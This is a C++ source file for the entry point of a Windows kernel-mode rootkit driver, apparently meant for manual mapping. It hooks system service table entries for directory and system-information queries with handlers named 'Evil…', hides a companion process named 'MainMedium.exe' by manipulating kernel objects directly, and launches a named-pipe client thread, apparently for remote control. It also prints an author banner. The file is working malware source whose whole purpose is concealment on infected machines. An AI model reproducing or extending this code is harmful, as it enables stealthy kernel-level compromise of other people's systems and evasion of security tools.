#include "piping.h"
#include "DKOM.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4127)


//extern "C" NTSTATUS DriverEntry(DRIVER_OBJECT * DriverObject, PUNICODE_STRING RegistryPath) {
extern "C" NTSTATUS DriverEntry(PVOID AllocationAddress, ULONG64 AllocationSize){
    //UNREFERENCED_PARAMETER(RegistryPath);
    //UNREFERENCED_PARAMETER(DriverObject);
    ULONG64 MediumPID = 0;


    // Hook NtQueryDirectoryFile/Ex and NtQuerySystemInformation (BETA) if IS_DKOM = 0 (FALSE):
    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFile, NTQUERY_TAG))) {
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQueryDirectoryFileEx, NTQUERYEX_TAG))) {
        return STATUS_UNSUCCESSFUL;
    }
    if (!IS_DKOM && !NT_SUCCESS(roothook::SSDT::SystemServiceDTHook(&roothook::EvilQuerySystemInformation, NTQUERYSYSINFO_TAG))) {
        return STATUS_UNSUCCESSFUL;

    }


    // Get PID of medium and delete it from list by default:
    if (!NT_SUCCESS(general_helpers::GetPidNameFromListADD(&MediumPID, "MainMedium.exe", TRUE)) || MediumPID == 0) {
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(process::DKHideProcess(MediumPID, TRUE))) {
        return STATUS_UNSUCCESSFUL;
    }


    const char* HelloMessage =
        "\n----------\n"
        " _____   _   _  ______ _____  _____ _______   __ ____ _______\n"
        "/ ____\\ | | | || ___  \\  _  |/  _  \\_    _/| / //_  _\\\\_   _/\n"
        "\\ `- -. | |_| || |_/  / | | || | | | | | | |/ /  | |    | |\n"
        " `- -. \\   _  ||     /| | | || | | | | | |    \\  | |    | |\n"
        "/\\__/  /  | | || |\\  \\\\ \\_/ /| \\_/ / | | | |\\  \\_| |_   | |\n"
        "\\____ / \\_| |_|| / \\__|\\___/ \\____/  |_| |_| \\_/\\___/   |_|\n\n"
        "Discord: bldysis#0868  GitHub: shaygitub\n"
        "\n----------\n";

    DbgPrintEx(0, 0, "Allocation base address: %p, Allocation size: %llu\n", AllocationAddress, AllocationSize);
    DbgPrintEx(0, 0, "%s", HelloMessage);

    
    // Execute pipe client thread:
    HANDLE PipeThread = NULL;
    NTSTATUS Status = PsCreateSystemThread(
        &PipeThread,
        GENERIC_ALL,
        NULL,
        NULL,
        NULL,
        (PKSTART_ROUTINE)PipeClient,
        NULL);

    if (!NT_SUCCESS(Status)){
        DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", Status);
        return STATUS_UNSUCCESSFUL;
    }
    ZwClose(PipeThread);
    return STATUS_SUCCESS;
}